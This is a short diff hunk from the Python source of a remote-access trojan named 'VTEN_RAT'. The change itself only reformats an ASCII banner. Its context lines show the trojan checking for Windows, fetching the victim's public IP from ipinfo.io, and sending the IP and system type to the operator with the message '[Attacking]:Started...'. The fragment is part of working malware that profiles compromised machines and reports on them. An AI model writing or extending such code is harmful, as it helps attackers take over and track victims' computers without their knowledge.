@@ -45,12 +45,12 @@ if os.name == "nt":
     ip = requests.get("https://ipinfo.io/json").json()['ip']
     ip = ip.center(12)
     sendMessage(f"""
-    ╔══════════════════════════════╗
-    ║          [VTEN_RAT]          ║
-    ║══════════════════════════════║
-    ║  [IP]: {ip}       ║
-    ║  [SYSTEM]: Windows           ║
-    ╚══════════════════════════════╝
+╔══════════════════════════════╗
+║          [VTEN_RAT]          
+║══════════════════════════════
+║  [IP]: {ip}       
+║  [SYSTEM]: Windows           
+╚══════════════════════════════╝
     
 [Attacking]:Started...
     """)
